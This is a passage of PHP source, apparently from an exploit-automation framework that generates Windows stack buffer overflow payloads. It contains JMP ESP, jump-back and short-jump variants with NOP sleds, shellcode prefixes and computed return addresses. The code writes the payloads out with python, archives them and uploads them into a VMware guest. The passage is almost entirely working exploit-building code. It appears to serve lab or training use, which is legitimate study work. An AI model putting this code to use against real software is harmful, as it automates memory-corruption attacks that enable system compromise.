	 			$jmp_esp_sc_before_egghunter = $this->hex2rev_32($addr_jmp_esp_sc_before_egghunter);
	 			$payload = "$header+\"$jmp_esp_sc_before_egghunter\"+$footer";
	 			// $payload = addcslashes($payload,'\\$');
	 			$query_jmp_esp_sc_before_egghunter = "python -c 'print $payload' | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_egghunter_" . "$addr_jmp_esp_sc_before_egghunter" . "." . "$ext_file";
	 			$this->requette($query_jmp_esp_sc_before_egghunter);
	 			$this->requette("vmrun -T ws -gu $login -gp $password copyFileFromHostToGuest $vmx $dir_tmp/exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_egghunter_" . "$addr_jmp_esp_sc_before_egghunter" . "." . "$ext_file C:\\\\tmp\\\\exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_egghunter_" . "$addr_jmp_esp_sc_before_egghunter" . "." . "$ext_file");
	 		}
	 	}
	 }
	 function ret2stack4win4jmp2esp4sc_before_jmpback($rep_path,$vmx, $programme, $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
	 	$nop = "\\x90";
	 	$junk = "\\x41";
	 	$vmx_name = trim(basename($vmx));
	 	$vmx_name = str_replace(".vmx", "", $vmx_name);
	 	$vmem_name = trim(basename($this->file_path));
	
	 	$this->chapitre("JMP ESP SC before jmpback");
	 	$vm_machine = new vm($vmx);
	
	 	$header_shellcode = '\x31\xc0\xb4\x10\x29\xc4\x90';
	 	$shellcode = $header_shellcode . $shellcode;
	
	 	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2+\"JMP BACK\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2'");
	 	$this->titre("Shellcode Size");
	 	$shellcode_size = $this->hex2size($shellcode);
	 	$this->titre("Header Size");
	 	$header_size = $this->hex2size($header);
	 	$this->titre("Footer Size");
	 	$footer_size = $this->hex2size($footer);
	
	 	$offset_header_eip = $offset_eip + $header_size;
	
	 	$nop_repeat_before = $offset_header_eip -($header_size + $shellcode_size);
	 	$nop_repeat_after_eip = 0;
	 	$junk_repeat = $exploit_size_max -($offset_header_eip + 4 + $nop_repeat_after_eip + 4 + $footer_size);
	
	 	$jmpback_int = intval($nop_repeat_after_eip + 4 + $shellcode_size +($nop_repeat_before / 2));
	 	// $jmpback_int = 247;
	 	$jmpback_hex = dechex(hexdec("ffffffff") - $jmpback_int);
	 	$jmpback = $this->hex2rev_32("0x$jmpback_hex");
	 	$jmpback = "\\xe9" . $jmpback;
	 	$header = "\"$header\"+\"$nop\"*$nop_repeat_before+\"$shellcode\"";
	
	 	$footer = "\"$nop\"*$nop_repeat_after_eip+\"$jmpback\"+\"$junk\"*$junk_repeat+\"$footer\"";
	
	 	$JMPs_ESP = $vm_machine->vm4jmp2reg($rep_path,"esp", $vmx, $this->file_path, $dll);
	 	$i = 1;
	 	$total_esp = count($JMPs_ESP);
	 	foreach($JMPs_ESP as $addr_jmp_esp_sc_before_jmpback) {
	 		$addr_jmp_esp_sc_before_jmpback = trim($addr_jmp_esp_sc_before_jmpback);
	 		if(! empty($addr_jmp_esp_sc_before_jmpback)) {
	 			$this->article("$i/$total_esp: JMP ESP", $addr_jmp_esp_sc_before_jmpback);
	 			$this->article("JMP BACK", $jmpback_int);
	 			$jmp_esp_sc_before_jmpback = $this->hex2rev_32($addr_jmp_esp_sc_before_jmpback);
	 			$payload = "$header+\"$jmp_esp_sc_before_jmpback\"+$footer";
	 			// $payload = addcslashes($payload,'\\$');
	 			$query_jmp_esp_sc_before_jmpback = "python -c 'print $payload' | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_jmpback_" . "$addr_jmp_esp_sc_before_jmpback" . "." . "$ext_file";
	 			$this->requette($query_jmp_esp_sc_before_jmpback);
	 		}
	 		$i ++;
	 	}
	 	// pause();
	 	$this->ssTitre("Compressing and Uploading Exploits");
	 	$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_jmpback.tar";
	 	$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_esp_sc_before_jmpback_*" . ".$ext_file ");
	
	 	$file = "$rep_path/$exploit_archive";
	 	$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
	 	$vm_machine->vm2upload($file, $dest);
	 }
	 function ret2stack4win4jmp2reg4short_jmp($rep_path,$vmx,$reg,  $offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max,$ext_file) {
	
	 	$this->chapitre("EIP JMP TO REGISTER $reg and NEAR JUMP");
	
	 	$vmx_name = trim(basename($vmx));
	 	$vmx_name = str_replace(".vmx", "", $vmx_name);
	 	$vmem_name = trim(basename($this->file_path));
	
	 	$nop = "\\x90";
	 	$junk = "\\x41";
	 	$vm_machine = new vm($vmx);
	
	 	$this->ssTitre("SHELLCODE SIZE");	$size_shellcode = $this->hex2size($shellcode);
	 	$this->ssTitre("HEADER SIZE");$header_size = $this->hex2size($header);
	 	$this->ssTitre("FOOTER SIZE");$footer_size = $this->hex2size($footer);
	
	 	$offset_eip = $offset_eip + $header_size;
	 	$header = "\"$nop\"*($offset_eip-$header_size-2)";
	 	$junk_repeat = $exploit_size_max -($offset_eip + 2 + 4 + $size_shellcode + $footer_size);
	 	$footer = "\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	
	 	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHORT JMP\"))+\"SHORT JMP\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	
	 	$tab_reg = $vm_machine->vm4jmp2reg($rep_path,$reg, $this->file_path, $dll);
	 	
	 	 $total_reg = count($tab_reg);
	 	 for($i = 0; $i < $total_reg; $i ++) {
	 		$reg_addr = trim($tab_reg [$i]);
	 		$addr_reg = $this->hex2rev_32($reg_addr);
	 		$short_jmp = "\\xeb\\x04";
	 		$this->article("$i/$total_reg - $reg", $reg_addr);
	 		$cmd = "python -c 'print $header+\"$short_jmp\"+\"$addr_reg\"+$footer'";
	 		$query = "$cmd | tee $rep_path/exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_short_jmp_$reg_addr" . ".$ext_file";
	 		// payload_check_norme("$shellcode$addr_reg");
	 		$this->requette($query);
	 		// $this->bin2debug4payload($cmd);
	 		// //pause();
	 		}
	 		// pause();
	 		$this->ssTitre("Compressing and Uploading Exploits");
	 		$exploit_archive = "exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_short_jmp.tar";
	 		$this->requette("cd $rep_path/; tar -cf $exploit_archive exploit_ret2stack4win_$this->file_path" . "_jmp_reg_" . "$reg" . "_short_jmp_*" . ".$ext_file ");
	
	 		$file = "$rep_path/$exploit_archive";
	 		$dest = "$vm_machine->vm_tmp_win\\\\$exploit_archive";
	 		$vm_machine->vm2upload($file, $dest);
	 		
	 }
	 ################################################################
	
	
	
	
}
?>